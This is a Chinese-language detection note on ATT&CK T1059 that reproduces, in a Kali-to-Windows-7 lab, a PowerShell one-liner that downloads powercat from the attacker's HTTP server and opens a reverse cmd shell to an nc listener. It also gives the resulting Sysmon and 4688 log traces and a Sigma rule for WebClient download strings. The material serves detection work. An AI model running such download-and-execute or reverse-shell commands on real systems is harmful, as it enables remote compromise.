# T1059-win-基于白名单Powershell.exe执行Payload

## 来自ATT&CK的描述

命令行界面是与计算机系统交互的一种方式，并且是很多操作系统平台的常见特性。例如，Windows系统上的命令行界面cmd可用于执行许多任务，包括执行其他软件。命令行界面可在本地交互或者通过远程桌面应用、反向shell会话等远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令需要调用进程来更改权限上下文（例如，定时任务）。

攻击者可能会使用命令行界面与系统交互并在操作过程中执行其他软件。

## 测试案例

您可以使用PowerShell.exe从另一个工具（例如Cmd.exe）的命令行启动PowerShell会话，也可以在PowerShell命令行启动新会话。从此处阅读Microsoft Windows官方网站上的更多信息。

补充说明：在高版本powershell（V5以上含V5）中，可以通过配置策略，对进程命令行参数进行记录，具体策略可参考[powershell事件](https://github.com/12306Bro/Hunting-guide/blob/master/Powershell-id.md)。同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志/SYSMON日志（需要自行安装）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon）

### 攻击分析

#### 生成payload

下载我们本次测试中要用到的powercat，下载地址：<https://github.com/besimorhino/powercat>

#### 开启小型http服务

powercat目录下执行以下命令：

```bash
root@12306Br0:~# python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

#### 执行监听

```bash
nc -lvp 1234
```

#### 靶机执行payload

```cmd
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd"
```

#### 反弹shell

```bash
root@12306Br0:/# nc -lvp 1234
listening on [any] 1234 ...
192.168.126.149: inverse host lookup failed: Unknown host
connect to [192.168.126.146] from (UNKNOWN) [192.168.126.149] 49339
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
```

## 测试留痕

```log
#sysmon日志
EventID: 1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell  -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd"

#win7安全日志
EventID: 4688
进程信息:
新进程 ID: 0x330
新进程名: C:\Windows\System32\cmd.exe
令牌提升类型: TokenElevationTypeLimited (3)

EventID: 4688
进程信息:
新进程 ID: 0xa44
新进程名: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

#Powershell V5(含V5以上)配置审核策略，可以达到记录命令行参数的效果。通过命令行参数进行监控分析。当然也可以采用配置windows server 2008(不含2008)以上审核进程创建策略，同样也可以对命令行参数进行记录，最后达到监控效果。
```

## 检测规则/思路

### sigma规则

```yml
title: PowerShell通过url进行下载
status: experimental
description: 检测在命令行字符串中包含下载命令的Powershell进程
tags:
    - attack.t1086
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image: '*\powershell.exe'
        CommandLine:
            - '*new-object system.net.webclient).downloadstring(*'
            - '*new-object system.net.webclient).downloadfile(*'
            - '*new-object net.webclient).downloadstring(*'
            - '*new-object net.webclient).downloadfile(*'
    condition: selection
fields:
    - CommandLine
    - ParentCommandLine
falsepositives:
    - unknown
level: medium

```

### 建议

可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略/sysmon。

## 相关TIP
[[T1059-001-win-检测PowerShell2.0版本执行]]
[[T1059-001-win-检测PowerShell下载文件]]
[[T1059-004-linux-脚本]]
[[T1059-win-基于Certutil.exe执行Payload(白名单)]]
[[T1059-win-基于Ftp.exe执行Payload(白名单)]]
[[T1059-win-进程生成CMD]]

## 参考推荐

MITRE-ATT&CK-T1059-001

<https://attack.mitre.org/techniques/T1059/001/>
